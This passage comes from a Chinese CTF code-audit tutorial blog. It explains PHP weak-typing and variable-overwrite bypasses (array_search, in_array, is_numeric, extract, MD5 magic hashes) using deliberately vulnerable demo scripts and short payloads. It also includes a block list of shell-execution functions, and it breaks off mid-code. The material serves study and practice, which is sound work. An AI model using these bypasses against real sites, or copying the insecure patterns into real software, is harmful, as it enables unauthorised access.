id="1-1-4-array-search和in-array"><a href="#1-1-4-array-search和in-array" class="headerlink" title="1.1.4  array_search和in_array"></a><strong>1.1.4  array_search和</strong>in_array</h3><p><strong>array_search</strong></p><p>array_search函数在数组中搜索某个键值，并返回对应的键名。</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'test'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$test</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'test'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$test</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$test</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"error"</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$test</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$test</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">array_search</span><span class="token punctuation">(</span><span class="token string">"admin"</span><span class="token punctuation">,</span><span class="token variable">$test</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"flag"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"false"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这段代码的意思就是先判断是不是数组，然后再把数组中的内容一个个进行遍历，所有内容都不能等于admin，并把所有内容转化成int型，最后若数组$test的键值为admin，则返回flag，如何绕过呢？</p><p>基本思路还是不变，因为用的是三个=，所以说“= =”号这个方法基本不能用，那就用第二条思路，利用函数接收到了不符合的类型返回“0”这个特性，直接绕过检测。所以payload：test[]=0。</p><p><strong>in_array</strong></p><p>在PHP手册中，in_array的函数解释是bool in_array （mixed needle,array haystack [, bool strict=FALSE]）</p><p>如果strict参数没有提供或者是false（true会进行严格的过滤），那么inarray就会使用松散比较来判断needle是否在$haystack中。当strince的值为true时，in_array()会比较needls的类型和haystack中的类型是否相同。</p><pre><code>$array=[0,1,2,&#39;3&#39;];var_dump(in_array(&#39;abc&#39;, $array));  //truevar_dump(in_array(&#39;1bc&#39;, $array));  //true</code></pre><h3 id="1-1-5-is-numeric"><a href="#1-1-5-is-numeric" class="headerlink" title="1.1.5  is_numeric"></a>1.1.5  is_numeric</h3><p><strong>参考资料：</strong></p><p><strong>1、</strong>PHP is_numeric() 函数  <a href="https://www.runoob.com/php/php-is_numeric-function.html" target="_blank" rel="noopener">https://www.runoob.com/php/php-is_numeric-function.html</a></p><p><strong>2、</strong>VulnCTF的练习教室v1.0——-WEB———–第四题【绕过and后面的is_numeric()】</p><p><a href="https://blog.csdn.net/nzjdsds/article/details/82947846" target="_blank" rel="noopener">https://blog.csdn.net/nzjdsds/article/details/82947846</a></p><p><a href="https://www.cnblogs.com/GH-D/p/8085676.html" target="_blank" rel="noopener">https://www.cnblogs.com/GH-D/p/8085676.html</a></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">'yes'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> <strong>is_numeric()</strong> 函数用于检测变量是否为数字或数字字符串（就是不能有除了数字以外的），利用%00截断来绕过is_numeric判断。</p><p><img src="/2020/05/09/best-codereview/4.png" alt="is_numeric"></p><h3 id="1-1-6-extract"><a href="#1-1-6-extract" class="headerlink" title="1.1.6  extract"></a>1.1.6  extract</h3><p><strong>参考资料：</strong></p><p><strong>1、</strong><code>BugKuCTF(CTF-练习平台)</code>——代码审计-extract变量覆盖  <a href="https://blog.csdn.net/qq_40980391/article/details/80097596" target="_blank" rel="noopener">https://blog.csdn.net/qq_40980391/article/details/80097596</a></p><p><code>extract()</code> 函数从数组中将变量导入到当前的符号表。</p><p>该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。</p><p>第二个参数<code>type</code>用于指定当某个变量已经存在，而数组中又有同名元素时，<code>extract()</code>函数如何对待这样的冲突。</p><p><img src="/2020/05/09/best-codereview/5.png" alt="extract"></p><h4 id="1-1-6-1-easy-demo1"><a href="#1-1-6-1-easy-demo1" class="headerlink" title="1.1.6.1  easy_demo1"></a>1.1.6.1  easy_demo1</h4><p>paylaod:  pass=&amp;thepassword_123=</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">"secret.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>The Ducks<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>css/bootstrap.min.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">crossorigin</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>anonymous<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>js/bootstrap.min.js<span class="token punctuation">"</span></span> <span class="token attr-name">crossorigin</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>anonymous<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>jumbotron<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>                <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">></span></span></span>                    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span></span>The Ducks<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></span>                    <span class="token delimiter">&lt;?php</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">"REQUEST_METHOD"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"POST"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token delimiter">?></span>                        <span class="token delimiter">&lt;?php</span>                        <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$pass</span> <span class="token operator">==</span> <span class="token variable">$thepassword_123</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token delimiter">?></span>                            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>alert alert-success<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>                                <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>code</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$theflag</span><span class="token punctuation">;</span> <span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>code</span><span class="token punctuation">></span></span></span>                            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span>                        <span class="token delimiter">&lt;?php</span> <span class="token punctuation">}</span> <span class="token delimiter">?></span>                    <span class="token delimiter">&lt;?php</span> <span class="token punctuation">}</span> <span class="token delimiter">?></span>                    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>.<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>                        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>row<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>                            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>col-md-6 col-md-offset-3<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>                                <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>row<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>                                    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>col-md-9<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>                                        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>form-control<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>pass<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Password<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></span>                                    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span>                                    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>col-md-3<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>                                        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>btn btn-primary<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Submit<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></span>                                    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span>                                <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span>                            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span>                        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span>                    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span>                <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>center</span><span class="token punctuation">></span></span></span>            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span>            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span></span>                <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">></span></span></span>                    source at <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>source.php<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token operator">/</span>source<span class="token punctuation">.</span>php<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span>                <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>center</span><span class="token punctuation">></span></span></span>            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="1-1-6-2-easy-demo2"><a href="#1-1-6-2-easy-demo2" class="headerlink" title="1.1.6.2  easy_demo2"></a>1.1.6.2  easy_demo2</h4><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">'s3cret.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$k</span> <span class="token operator">=</span> <span class="token string">'hello'</span><span class="token punctuation">;</span>    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$uid</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$content</span><span class="token operator">=</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$k</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$uid</span><span class="token operator">==</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">'hello'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2020/05/09/best-codereview/11.png" alt="extract+伪协议"></p><h4 id="1-1-6-3-hard-demo"><a href="#1-1-6-3-hard-demo" class="headerlink" title="1.1.6.3  hard_demo"></a>1.1.6.3  hard_demo</h4><p><strong>参考资料：</strong></p><p><strong>1、</strong>红日Day5-CTF  <a href="https://blog.csdn.net/zhangpen130/article/details/103939281/" target="_blank" rel="noopener">https://blog.csdn.net/zhangpen130/article/details/103939281/</a></p><p><strong>2、</strong>PHP 数组  <a href="https://www.runoob.com/php/php-arrays.html" target="_blank" rel="noopener">https://www.runoob.com/php/php-arrays.html</a></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">function</span> <span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/flag/i'</span><span class="token punctuation">,</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">'are you a hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'_POST'</span><span class="token punctuation">,</span> <span class="token string">'_GET'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token variable">$__R</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>$<span class="token variable">$__R</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token keyword">foreach</span><span class="token punctuation">(</span>$<span class="token variable">$__R</span> <span class="token keyword">as</span> <span class="token variable">$__k</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$__v</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>             <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span>$<span class="token variable">$__k</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> $<span class="token variable">$__k</span> <span class="token operator">==</span> <span class="token variable">$__v</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token function">unset</span><span class="token punctuation">(</span>$<span class="token variable">$__k</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span> <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">,</span> <span class="token constant">EXTR_SKIP</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'hongri'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'hongri'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"this is flag"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>payload:</strong></p><p><img src="/2020/05/09/best-codereview/6.png" alt="payload"></p><p>post过去两个值，<code>$_POST</code>是一个关联数组，键名是_GET，键值又是一个关联数组</p><pre><code>array(1) {  &#39;_GET&#39; =&gt;  array(2) {    &#39;flag&#39; =&gt;    string(9) &quot;240610708&quot;    &#39;hongri&#39; =&gt;    string(7) &quot;QNKCDZO&quot;  } } </code></pre><p>get过去两个值，<code>$_GET</code>也是一个关联数组</p><pre><code>array(2) {  &#39;flag&#39; =&gt;  string(9) &quot;240610708&quot;  &#39;hongri&#39; =&gt;  string(7) &quot;QNKCDZO&quot; } </code></pre><p><code>$_GET</code>与<code>$_POST</code>的键值是相等的。</p><p><img src="/2020/05/09/best-codereview/7.png" alt="调试过程"></p><p>先构造相等，unset把<code>$_GET</code>释放掉，再利用extract根据<code>$_POST</code>的键名和键值得到<code>$_GET</code>，从而绕过waf的检测，满足<code>if(isset($_GET[&#39;flag&#39;]))</code>的条件。</p><h3 id="1-1-7-function（读取文件内容）"><a href="#1-1-7-function（读取文件内容）" class="headerlink" title="1.1.7  function（读取文件内容）"></a>1.1.7  function（读取文件内容）</h3><p>好几次碰到题目没想到去读index.php或其他文件的内容，这里好好记录反省下。能用于读取文件内容的php函数有readfile、hightlight_file、file_get_contents、show_source。</p><h4 id="1-1-7-1-特性"><a href="#1-1-7-1-特性" class="headerlink" title="1.1.7.1  特性"></a>1.1.7.1  特性</h4><p><strong>readfile</strong></p><pre><code>readfile(&quot;flag.php&quot;,&quot;&quot;)    //后面那个参数可以为空</code></pre><h4 id="1-1-7-2-demo1"><a href="#1-1-7-2-demo1" class="headerlink" title="1.1.7.2  demo1"></a>1.1.7.2  demo1</h4><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$disable_fun</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span><span class="token string">"shell_exec"</span><span class="token punctuation">,</span><span class="token string">"system"</span><span class="token punctuation">,</span><span class="token string">"passthru"</span><span class="token punctuation">,</span><span class="token string">"proc_open"</span><span class="token punctuation">,</span><span class="token string">"show_source"</span><span class="token punctuation">,</span><span class="token string">"phpinfo"</span><span class="token punctuation">,</span><span class="token string">"popen"</span><span class="token punctuation">,</span><span class="token string">"dl"</span><span class="token punctuation">,</span><span class="token string">"eval"</span><span class="token punctuation">,</span><span class="token string">"proc_terminate"</span><span class="token punctuation">,</span><span class="token string">"touch"</span><span class="token punctuation">,</span><span class="token string">"escapeshellcmd"</span><span class="token punctuation">,</span><span class="token string">"escapeshellarg"</span><span class="token punctuation">,</span><span class="token string">"assert"</span><span class="token punctuation">,</span><span class="token string">"substr_replace"</span><span class="token punctuation">,</span><span class="token string">"call_user_func_array"</span><span class="token punctuation">,</span><span class="token string">"call_user_func"</span><span class="token punctuation">,</span><span class="token string">"array_filter"</span><span class="token punctuation">,</span> <span class="token string">"array_walk"</span><span class="token punctuation">,</span>  <span class="token string">"array_map"</span><span class="token punctuation">,</span><span class="token string">"registregister_shutdown_function"</span><span class="token punctuation">,</span><span class="token string">"register_tick_function"</span><span class="token punctuation">,</span><span class="token string">"filter_var"</span><span class="token punctuation">,</span> <span class="token string">"filter_var_array"</span><span class="token punctuation">,</span> <span class="token string">"uasort"</span><span class="token punctuation">,</span> <span class="token string">"uksort"</span><span class="token punctuation">,</span> <span class="token string">"array_reduce"</span><span class="token punctuation">,</span><span class="token string">"array_walk"</span><span class="token punctuation">,</span> <span class="token string">"array_walk_recursive"</span><span class="token punctuation">,</span><span class="token string">"pcntl_exec"</span><span class="token punctuation">,</span><span class="token string">"fopen"</span><span class="token punctuation">,</span><span class="token string">"fwrite"</span><span class="token punctuation">,</span><span class="token string">"file_put_contents"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">gettime</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$a</span><span class="token operator">=</span> <span class="token function">gettype</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">==</span> <span class="token string">"string"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$result</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span>    <span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token string">"Y-m-d h:i:sa"</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> <span class="token variable">$func</span> <span class="token operator">=</span> <span class="token string">"date"</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token 